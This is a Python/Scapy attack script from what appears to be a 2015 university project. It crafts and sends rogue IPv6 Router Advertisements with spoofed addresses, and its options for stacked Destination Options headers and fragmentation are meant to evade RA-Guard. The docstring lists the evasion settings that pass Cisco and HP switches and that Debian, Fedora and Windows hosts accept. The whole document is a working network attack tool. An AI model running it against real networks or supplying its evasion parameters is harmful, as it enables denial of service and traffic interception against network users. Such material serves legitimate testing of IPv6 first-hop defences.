#!/usr/bin/env python

# rra.py: Rogue router advertisment attack script
#
# Copyright (c) 2015 Brno University of Technology
#
# Author(s): Jozef Pivarník <xpivar00@stud.fit.vutbr.cz>
#


"""
Basic attack example: ./rra.py -i p5p1 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0

Extension headers: ./rra.py -i p5p1 -s 30:e4:db:17:ef:a0 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 180
  Cisco: passes from 7 to 16 (including) empty DestOpt headers (no additional options)
  HP: passes 3 or more empty DestOpt headers (no additional options)
  Debian: multicasted RA: max 16
          unicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)
  Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
  Windows: multicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)
           unicasted RA: no limit (as MAC address also 33:33:00:00:00:01 and ff:ff:ff:ff:ff:ff may be used)

Fragmentation: ./rra.py -i p5p1 -s 30:e4:db:17:ef:a0 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 2 -f 80
  Cisco: passes
  HP: passes
  Debian: multicasted RA: OK
          unicasted RA: OK
  Fedora: multicasted RA: OK
          unicasted RA: OK
  Windows: multicasted RA: OK
           unicasted RA: OK

Fragmentation + extension headers: ./rra.py -i p5p1 -S fe80::32e4:dbff:fe17:efa0 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -l 0 -e 180 -f 100
  Cisco: passes
  HP: passes
  Debian: unicasted RA: as many fragments as needed with as many DestOpt hdrs as needed, but broadcast or multicast L2 address may not be used
          multicasted RA: this works: -e 2 -f 80 | -e 5 -f 100 | -e 4 -f 100 | -e 15 -f 200 | -e 17 -f 200
  Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
  Windows: unicasted RA: as many fragments as needed with as many DestOpt hdrs as needed
           multicasted RA: as many fragments as needed with as many DestOpt hdrs as needed
"""

from scapy.all import Ether, IPv6, IPv6ExtHdrFragment, IPv6ExtHdrDestOpt, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptMTU, ICMPv6NDOptPrefixInfo, fragment6, sendp
import argparse
import netifaces as ni
import sys

parser = argparse.ArgumentParser(description='Send crafted Rogue Router Advertisement.')
parser.add_argument('-i', '--interface', help='target interface', required=True)
parser.add_argument('-s', '--srcmac', help='source MAC address')
parser.add_argument('-d', '--dstmac', help='destination MAC address', required=True)
parser.add_argument('-S', '--srcip', help='source IP address')
parser.add_argument('-D', '--dstip', help='destination IP address', required=True)
parser.add_argument('-c', '--curhop', help='cur hop limit', type=int, default=0)
parser.add_argument('-p', '--preference', help='router preference', choices={0, 1, 3}, default=1, type=int)
parser.add_argument('-l', '--lifetime', help='router lifetime', type=int, default=300)
parser.add_argument('-r', '--reachtime', help='reachable time', type=int, default=0)
parser.add_argument('-R', '--retrtime', help='retrans timer', type=int, default=0)
parser.add_argument('-e', '--exthdrs', help='number of empty Destination Options extension headers', type=int)
parser.add_argument('-f', '--frag', help='size of max MTU when using fragmentation', type=int)
parser.add_argument('-a', '--lladdr', help='source link-layer address option')
parser.add_argument('-m', '--mtu', help='advertised MTU', type=int)
parser.add_argument('-P', '--prefix', help='advertised prefix', nargs=7, metavar=('PREFIX', 'LENGTH', 'L-FLAG', 'A-FLAG', 'R-FLAG', 'VALID-LIFETIME', 'PREFERRED-LIFETIME'))
args = parser.parse_args()

try:
    if not args.srcmac:
        args.srcmac = ni.ifaddresses(args.interface)[ni.AF_LINK][0]['addr']

    if not args.srcip:
        for addr in ni.ifaddresses(args.interface)[ni.AF_INET6]:
            if addr['addr'].lower().startswith('fe80'):
                args.srcip = addr['addr'][:-(len(args.interface) + 1)]  # Remove '%interface' from link-local address

    p = Ether(src=args.srcmac, dst=args.dstmac)/IPv6(src=args.srcip, dst=args.dstip, hlim=255)

    if args.frag:
        p /= IPv6ExtHdrFragment()

    if args.exthdrs:
        for i in range(args.exthdrs):
            p /= IPv6ExtHdrDestOpt()

    p /= ICMPv6ND_RA(chlim=args.curhop, prf=args.preference, routerlifetime=args.lifetime, reachabletime=args.reachtime, retranstimer=args.retrtime)

    if args.lladdr:
        p /= ICMPv6NDOptSrcLLAddr(lladdr=args.lladdr)

    if args.mtu:
        p /= ICMPv6NDOptMTU(mtu=args.mtu)

    if args.prefix:
        p /= ICMPv6NDOptPrefixInfo(prefix=args.prefix[0], prefixlen=int(args.prefix[1]), L=int(args.prefix[2]), A=int(args.prefix[3]), R=int(args.prefix[4]), validlifetime=int(args.prefix[5]), preferredlifetime=int(args.prefix[6]))

    if args.frag:
        sendp(fragment6(p, args.frag), iface=args.interface)
    else:
        sendp(p, iface=args.interface)
except:
    sys.stderr.write('Unable to send a packet\n')
